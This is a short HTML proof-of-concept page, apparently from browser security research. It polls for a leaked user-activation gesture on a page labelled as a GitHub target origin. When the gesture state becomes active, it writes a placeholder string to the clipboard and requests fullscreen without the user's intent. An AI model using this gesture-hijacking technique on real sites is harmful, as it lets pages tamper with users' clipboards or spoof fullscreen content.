<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit Target - Multi-PoC</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 50px; background: #fafafa; }
        .box { border: 2px solid #ccc; padding: 15px; margin: 10px; border-radius: 8px; background: white; }
        .active { border-color: red; color: red; font-weight: bold; }
        .success { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Target Origin (GitHub)</h1>
    <p>Status Activation: <span id="status">WAITING...</span></p>
    <script>
        const statusEl = document.getElementById('status');
        const leakCheck = setInterval(async () => {
            const isActive = navigator.userActivation.isActive;

            if (isActive) {
                clearInterval(leakCheck); 
                statusEl.innerText = "LEAKED! EXECUTING PAYLOADS...";
                statusEl.className = "active";
                try {
                    await navigator.clipboard.writeText("VULNERABLE_GHOST_GESTURE_DATA");
                } catch (e) { console.log("Clipboard fail: " + e.message); }
                try {
                    await document.documentElement.requestFullscreen();
                } catch (e) { console.log("Fullscreen fail: " + e.message); }
            }
        }, 50);
    </script>
</body>
</html>
